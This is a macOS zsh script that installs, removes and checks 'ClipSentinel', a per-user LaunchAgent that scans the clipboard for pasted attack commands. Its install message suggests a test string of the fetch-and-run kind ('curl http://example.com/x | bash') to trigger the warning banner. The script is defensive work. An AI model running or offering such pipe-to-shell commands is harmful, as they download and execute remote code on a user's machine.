#!/bin/zsh
# ==============================================================================
# install.sh — load/unload ClipSentinel as a per-user LaunchAgent
# ==============================================================================
#
#   ./install.sh              install + start (default)
#   ./install.sh install      same as above
#   ./install.sh uninstall    stop + remove the LaunchAgent
#   ./install.sh status       show whether it's loaded and running
#   ./install.sh run          run clipsentinel.sh in the foreground (test mode)
#
# What "install" does:
#   1. Resolves the absolute directory this script lives in.
#   2. Renders the plist template, substituting __CLIPSENTINEL_DIR__ with that
#      directory, into ~/Library/LaunchAgents/com.clickfixkit.clipsentinel.plist
#   3. Loads it with launchctl so it starts now and at every login.
#
# macOS-only. No external dependencies.
#
# NOTE ON SIGNING / PRIVACY: ClipSentinel reads your clipboard once per change
# to check it for attack patterns. It never stores or transmits clipboard
# contents. On macOS 15.4+ a background app that reads the clipboard may surface
# a privacy indicator; that is expected and benign here. If you distribute this
# tool to others, sign + notarize it — an unsigned background clipboard reader
# is, reasonably, treated as suspicious.
# ==============================================================================

emulate -L zsh
setopt err_exit no_unset pipe_fail

# ---- Resolve this script's own directory (absolute) --------------------------
SCRIPT_DIR="${0:A:h}"

LABEL="com.clickfixkit.clipsentinel"
TEMPLATE="${SCRIPT_DIR}/${LABEL}.plist"
WATCHER="${SCRIPT_DIR}/clipsentinel.sh"
AGENTS_DIR="${HOME}/Library/LaunchAgents"
INSTALLED_PLIST="${AGENTS_DIR}/${LABEL}.plist"

# launchctl gui domain target for the current user.
GUI_DOMAIN="gui/$(id -u)"

err() { print -r -- "[install] ERROR: $*" >&2; exit 1; }
info() { print -r -- "[install] $*"; }

_preflight() {
  [[ "$(uname -s)" == "Darwin" ]] || err "macOS only (uname is $(uname -s))."
  [[ -f "$TEMPLATE" ]] || err "plist template not found at $TEMPLATE"
  [[ -f "$WATCHER" ]]  || err "clipsentinel.sh not found at $WATCHER"
  command -v launchctl >/dev/null 2>&1 || err "launchctl not found."
}

cmd_install() {
  _preflight
  mkdir -p "$AGENTS_DIR"
  chmod +x "$WATCHER" 2>/dev/null || true

  # If already loaded, unload first so we cleanly replace it.
  if launchctl print "${GUI_DOMAIN}/${LABEL}" >/dev/null 2>&1; then
    info "Already loaded — unloading old instance first."
    launchctl bootout "${GUI_DOMAIN}/${LABEL}" 2>/dev/null || true
  fi

  # Render the template: substitute the install dir token. We use sed only for
  # this trivial token replacement on a file we own (not user content).
  info "Rendering plist -> $INSTALLED_PLIST"
  sed "s|__CLIPSENTINEL_DIR__|${SCRIPT_DIR}|g" "$TEMPLATE" > "$INSTALLED_PLIST"

  # Validate the rendered plist before loading.
  if command -v plutil >/dev/null 2>&1; then
    plutil -lint "$INSTALLED_PLIST" >/dev/null || err "rendered plist failed plutil -lint"
  fi

  # Load it. Prefer the modern bootstrap; fall back to legacy load.
  info "Bootstrapping LaunchAgent into ${GUI_DOMAIN}"
  if ! launchctl bootstrap "$GUI_DOMAIN" "$INSTALLED_PLIST" 2>/dev/null; then
    info "bootstrap failed/unavailable — falling back to 'launchctl load'."
    launchctl load -w "$INSTALLED_PLIST" || err "launchctl load failed."
  fi

  # Kick it immediately (bootstrap + RunAtLoad usually starts it, but be sure).
  launchctl kickstart -k "${GUI_DOMAIN}/${LABEL}" 2>/dev/null || true

  info "Installed and started. ClipSentinel is now watching your clipboard."
  info "Test it: copy this to your clipboard ->  curl http://example.com/x | bash"
  info "         (you should get a 'dangerous shell command copied' banner)"
  info "Uninstall any time with:  ./install.sh uninstall"
}

cmd_uninstall() {
  _preflight
  if launchctl print "${GUI_DOMAIN}/${LABEL}" >/dev/null 2>&1; then
    info "Unloading LaunchAgent."
    launchctl bootout "${GUI_DOMAIN}/${LABEL}" 2>/dev/null \
      || launchctl unload -w "$INSTALLED_PLIST" 2>/dev/null || true
  else
    info "Not currently loaded."
  fi

  if [[ -f "$INSTALLED_PLIST" ]]; then
    info "Removing $INSTALLED_PLIST"
    rm -f "$INSTALLED_PLIST"
  fi
  info "Uninstalled. ClipSentinel will no longer run at login."
}

cmd_status() {
  _preflight
  if launchctl print "${GUI_DOMAIN}/${LABEL}" >/dev/null 2>&1; then
    info "LOADED in ${GUI_DOMAIN}."
    # Show the PID/last-exit if available.
    launchctl print "${GUI_DOMAIN}/${LABEL}" 2>/dev/null \
      | grep -E '(pid|state|last exit code) =' || true
  else
    info "NOT loaded."
  fi
  [[ -f "$INSTALLED_PLIST" ]] && info "Installed plist present: $INSTALLED_PLIST" \
                              || info "No installed plist."
}

# Run in the foreground for quick testing (no launchd involved).
cmd_run() {
  _preflight
  chmod +x "$WATCHER" 2>/dev/null || true
  info "Running clipsentinel.sh in the foreground (Ctrl-C to stop)."
  exec /bin/zsh "$WATCHER"
}

case "${1:-install}" in
  install)   cmd_install   ;;
  uninstall) cmd_uninstall ;;
  status)    cmd_status    ;;
  run)       cmd_run       ;;
  *) err "unknown command '$1' (use: install | uninstall | status | run)" ;;
esac
